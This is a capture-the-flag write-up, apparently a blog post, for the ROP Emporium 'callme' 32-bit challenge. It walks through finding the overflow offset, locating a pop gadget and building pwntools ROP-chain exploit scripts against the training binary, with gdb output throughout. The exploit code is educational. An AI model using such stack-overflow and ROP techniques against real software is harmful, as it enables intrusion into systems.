---
layout: post
title: "ropemporium - callme 32bit writeup"
---

# Description of the challenge
_Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table._

# Gathering information
The challenge information says that I should call `callme_one`, `callme_two` and `callme_three` in sequence with the arguments `1`, `2` and `3`.
I'll start by executing the binary normally and giving it `test` as input. To see what it says.
```
$ ./callme32
callme by ROP Emporium
32bits

Hope you read the instructions...
> test

Exiting
```
I then wanted to get the addresses of `callme_one`, `callme_two` and `callme_three`. I used radare2 for this.
```
$ r2 callme32
[0x08048640]> aas
[0x08048640]> afl
0x08048558    3 35           sym._init
0x08048590    1 6            sym.imp.printf
0x080485a0    1 6            sym.imp.fgets
0x080485b0    1 6            sym.imp.callme_three
0x080485c0    1 6            sym.imp.callme_one
0x080485d0    1 6            sym.imp.puts
0x080485e0    1 6            sym.imp.exit
0x080485f0    1 6            sym.imp.__libc_start_main
0x08048600    1 6            sym.imp.setvbuf
0x08048610    1 6            sym.imp.memset
0x08048620    1 6            sym.imp.callme_two
0x08048630    1 6            fcn.08048630
0x08048640    1 34           sym._start
0x08048670    1 4            sym.__x86.get_pc_thunk.bx
0x08048680    4 43           sym.deregister_tm_clones
0x080486b0    4 53           sym.register_tm_clones
0x080486f0    3 30           sym.__do_global_dtors_aux
0x08048710    4 43   -> 40   entry1.init
0x0804873b    1 123          sym.main
0x080487b6    1 86           sym.pwnme
0x0804880c    4 161          sym.usefulFunction
0x080488b0    1 2            sym.__libc_csu_fini
0x080488b4    1 20           sym._fini
0x080488c8    1 4            obj._fp_hw
0x080488cc   11 84           obj._IO_stdin_used
0x08048920    1 14           loc.__GNU_EH_FRAME_HDR
0x08048a60    1 4            obj.__FRAME_END__
[0x08048640]>
```
`aas` is the command to analyze symbols in the executable.
`afl` is the command to list functions.
So, I now have the three addresses that I need.
Let's find the padding now. I used `pwntools` to accomplish this.
```python
>>> from pwn import cyclic,fit
>>> cyclic(50)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
```
What `cyclic` does is create a string pattern that you can use to get the padding (if big enough) to overwrite the return address.
I used `gdb` to help me.
```
$ gdb ./callme32 -q
Reading symbols from ./callme32...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/pwn/ropemporium/callme/32/callme32
callme by ROP Emporium
32bits

Hope you read the instructions...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
(gdb) x/x $eip
0x6161616c:     Cannot access memory at address 0x6161616c
(gdb)
```
`r` starts up the program.
`0x6161616c in ?? ()` shows that `eip` has been overwritten.
I double checked with `x/x $eip`.
I then used the `fit` function from `pwntools`.
```python
>>> fit({0x6161616c:'B'})
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaaB'
>>> len(_)
45
```
The length of the padding is 44 because the output of `fit` is the string pattern _and_ a B, and the B is where it starts overwriting, so I need one less byte.

# Writing an exploit
I started writing an exploit script with the information that I had.
```python
from pwn import *

payload = 'A'*44 # padding
payload += p32(0x080485c0) # callme_one(1,2,3)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(0x08048620) # callme_two(1,2,3)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(0x080485b0) # callme_three(1,2,3)
payload += p32(1)
payload += p32(2)
payload += p32(3)

print payload
```
Why `p32` does is "pack" an 32-bit integer.
Here's an example:
```
>>> p32(1)
'\x01\x00\x00\x00'
```
I tried the exploit:
```
$ python exploit.py | ./callme32 
callme by ROP Emporium
32bits

Hope you read the instructions...
> Incorrect parameters
```
Hmm, it did not work.

## Troubleshooting
I wanted to know what went wrong, so I decided to use `gdb` 
```
$ python exploit.py > payload
$ gdb ./callme32 -q
Reading symbols from ./callme32...(no debugging symbols found)...done.
(gdb) b callme_one
Breakpoint 1 at 0x80485c0
(gdb) b callme_two
Breakpoint 2 at 0x8048620
(gdb) b callme_three
Breakpoint 3 at 0x80485b0
(gdb) r < payload 
Starting program: /home/pwn/ropemporium/callme/32/callme32 < payload
callme by ROP Emporium
32bits

Hope you read the instructions...
> 
Breakpoint 1, 0xf7fcc6d4 in callme_one () from ./libcallme32.so
(gdb) x/x $esp
0xffffd2c8:     0x00000000
(gdb) x/2x $esp
0xffffd2c8:     0x00000000      0x41414141
(gdb) x/3x $esp
0xffffd2c8:     0x00000000      0x41414141      0x00000001
(gdb) x/4x $esp
0xffffd2c8:     0x00000000      0x41414141      0x00000001      0x00000002
(gdb) c
Continuing.
Incorrect parameters
[Inferior 1 (process 109162) exited with code 01]
(gdb)
```
So it looks like I forgot to put an address that I want to return to after the `callme_one` function.
And I also realised that I'll need a `pop` gadget to pop the arguments off the stack into registers, after the function is being called.
I used `ropper` to get the address of a `pop` chain.
```c
$ ropper --file callme32 --search "pop"
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: callme32
0x080488ab: pop ebp; ret; 
0x080488a8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x08048579: pop ebx; ret; 
0x080488aa: pop edi; pop ebp; ret; 
0x080488a9: pop esi; pop edi; pop ebp; ret; 
0x080488c0: pop ss; add byte ptr [eax], al; add esp, 8; pop ebx; ret; 
0x080487b3: popal; cld; ret;

```
`0x080488a9: pop esi; pop edi; pop ebp; ret; ` looks good to me.
So adding the address `0x080488a9` after the `callme_x` addresses should do the trick.
```python
from pwn import *

pop3 = p32(0x080488a9) # pop esi; pop edi; pop ebp; ret; 

payload = 'A'*44 # padding
payload += p32(0x080485c0) # callme_one(1,2,3)
payload += pop3
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(0x08048620) # callme_two(1,2,3)
payload += pop3
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(0x080485b0) # callme_three(1,2,3)
payload += pop3
payload += p32(1)
payload += p32(2)
payload += p32(3)

print payload
```
Now to test the exploit:
```
$ python exploit.py | ./callme32 
callme by ROP Emporium
32bits

Hope you read the instructions...
> ROPE{a_placeholder_32byte_flag!}
```
Success!

## Finalizing the exploit.
I decided I should make the exploit script more properly, just for fun, and ease.
I used `pwntools` to help with this.
I came up with this:
```python
from pwn import *

proc = process('./callme32')

pop3 = p32(0x080488a9) # pop esi; pop edi; pop ebp; ret; 

payload = 'A'*44 # padding
payload += p32(0x080485c0) # callme_one(1,2,3)
payload += pop3
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(0x08048620) # callme_two(1,2,3)
payload += pop3
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(0x080485b0) # callme_three(1,2,3)
payload += pop3
payload += p32(1)
payload += p32(2)
payload += p32(3)

log.info('Payload length: {}'.format(len(payload)))
"""
callme by ROP Emporium
32bits

Hope you read the instructions...
> """ #output from the executable
proc.recvuntil('> ') #receive output until "> "
log.info('Sending payload')
proc.sendline(payload) #send the payload
log.info('Payload sent!')
output = proc.recv()
log.success('Output: {}'.format(output))
```
And upon running: 
```bash
$ python exploit.py
[+] Starting local process './callme32': pid 109967
[*] Payload length: 104
[*] Sending payload
[*] Payload sent!
[*] Process './callme32' stopped with exit code 0 (pid 109967)
[+] Output: ROPE{a_placeholder_32byte_flag!}
```
This is good enough for me.

# Summary
I started with gahtering information like the addresses of the functions `callme_one`,`callme_two` and`callme_three`. Then I tried to find the correct padding to overwrite the return address with what I want it to be. After gathering all the information, I started writing my exploit. At first it did not succeed because I didn't use a `pop` (times 3) gadget. After editing the exploit script it finally worked, and got the flag: `ROPE{a_placeholder_32byte_flag!}`

## Things I didn't get to explain properly

### The use of the pop instruction
In the exploit development section I didn't explain why I need to pop values from the stack into registers. This is because the values will otherwise remain on the stack but incorrectly. I'll demonstrate it by using this exploit script:
```python
from pwn import *

payload = 'A'*44 # padding
payload += p32(0x080485c0) # callme_one(1,2,3)
payload += p32(0x08048620) # callme_two(1,2,3)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(0x080485b0) # callme_three(1,2,3)

print payload
```
After writing the output of the script to a file named `payload`, I started `gdb`.
```
$ gdb ./callme32 -q
Reading symbols from ./callme32...(no debugging symbols found)...done.
(gdb) b callme_one
Breakpoint 1 at 0x80485c0
(gdb) b callme_two
Breakpoint 2 at 0x8048620
(gdb) r < payload 
Starting program: /home/qh/CTF/ropemporium/callme/32/callme32 < payload
callme by ROP Emporium
32bits

Hope you read the instructions...
> 
Breakpoint 1, 0xf7fcc6d4 in callme_one () from ./libcallme32.so
(gdb) x/6x $ebp
0xffffd2cc:     0x41414141      0x08048620      0x00000001      0x00000002
0xffffd2dc:     0x00000003      0x080485b0
(gdb) c
Continuing.

Breakpoint 2, 0xf7fcc7d2 in callme_two () from ./libcallme32.so
(gdb) x/6x $ebp
0xffffd2d0:     0x41414141      0x00000001      0x00000002      0x00000003
0xffffd2e0:     0x080485b0      0xf7f9000a
(gdb)
```

What I first do is `b callme_one`,`b callme_two`. This sets a "breakpoint" and that makes the program stop executing instructions and return to the debugger. Then I do `r < payload` which makes gdb run the program, with the file contents of `payload` as input. and `x/6x $ebp` to examine the arguments that were passed.
After the first examination you can see that after `0x41414141` is the address of `callme_two`. And the arguments on the stack look like this (schematically):
```
+-----------+
|    0x1    |
+-----------+
|    0x2    |
+-----------+
|    0x3    |
+-----------+
```
This works fine. But after `callme_one` there is no other return address, so then `0x00000001`  becomes the return address and the arguments on the stack look like this:
```
+-------------+
|     0x2     |
+-------------+
|     0x3     |
+-------------+
| 0x080485b0  |
+-------------+
```

### Gadgets
A 'gadget', aka. "rop gadget" is a sequence of instructions followed by a `ret` instruction. You can use this to "program" with just the addresses of the gadgets.

# Helpful links and resources
[challenge](https://ropemporium.com/challenge/callme.html)

[pwntools](https://github.com/Gallopsled/pwntools)

[gdb-peda](https://github.com/longld/peda)

[MBE (modern binary exploitation) by RPISEC](https://github.com/RPISEC/MBE/)
